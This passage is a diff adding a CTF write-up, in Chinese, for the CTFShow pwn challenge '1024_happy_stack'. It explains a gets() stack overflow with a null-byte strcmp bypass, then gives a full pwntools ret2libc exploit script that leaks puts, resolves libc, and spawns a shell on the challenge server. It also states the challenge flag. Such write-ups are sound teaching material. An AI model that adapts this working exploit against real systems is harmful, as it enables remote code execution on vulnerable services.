@@ -1013,3 +1013,63 @@ io.interactive()
 
 ------
 
+### 1024_happy_stack
+
+先`file ./1024_happy_stack`查看文件类型再`checksec --file=1024_happy_stack`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/1.png)
+
+用`IDA Pro 64bit`打开附件`1024_happy_stack`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x380h`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。注意到`ctfshow()`函数的返回值为真时会结束程序。
+
+![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/2.png)
+
+双击`ctfshow()`函数查看详情，函数返回值直接是`strcmp()`的比较结果。`strcmp()`函数是用于比较两个字符串并根据比较结果返回整数。基本形式为`strcmp(str1,str2)`，若`str1=str2`，则返回零；若`str1<str2`，则返回负数；若`str1>str2`，则返回正数。也就是说从`main()`函数中传入的参数和字符串`"36D"`的`strcmp()`比较结果必须为`0`才能执行主函数中的`puts()`函数。有什么办法能够让变量`s`造成栈溢出的同时又能与`"36D"`的比较结果相等呢？构造`payload`时可以利用`\x00`来让`s`和`"36D"`匹配上。
+
+![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/3.png)
+
+在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。
+
+在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。
+
+![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/4.png)
+
+编写`Python`代码即可得到`ctfshow{ed60fbe2-5815-456a-abc1-4b45fd120cf0}`。
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('pwn.challenge.ctf.show', 28088)
+# io = process('./1024_happy_stack')
+e = ELF('./1024_happy_stack')
+payload = b'36D\x00'.ljust(0x388, b'a')
+pop_rdi = 0x400803 # ROPgadget --binary ./1024_happy_stack --only "pop|ret"
+puts_plt = e.plt['puts']
+info('puts_plt => 0x%x', puts_plt)
+puts_got = e.got['puts']
+info('puts_got => 0x%x', puts_got)
+main_address = e.symbols['main']
+payload += flat(pop_rdi, puts_got, puts_plt, main_address)
+io.recv()
+io.sendline(payload)
+io.recvuntil(b'36D\n')
+puts_address = u64(io.recv(6).ljust(8, b'\x00'))
+log.success('puts_address => 0x%x', puts_address)
+pop_ret = 0x40028a # ROPgadget --binary ./1024_happy_stack --only "pop|ret"
+libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.27-3ubuntu1_amd64
+libcbase = puts_address - libc.dump('puts')
+system_address = libcbase + libc.dump('system')
+info('system_address => 0x%x', system_address)
+bin_sh_address = libcbase + libc.dump(('str_bin_sh'))
+info('bin_sh_address => 0x%x', bin_sh_address)
+payload = b'36D\x00'.ljust(0x388, b'a')
+payload += flat(pop_ret, pop_rdi, bin_sh_address, system_address)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/5.png)
+
+------
+
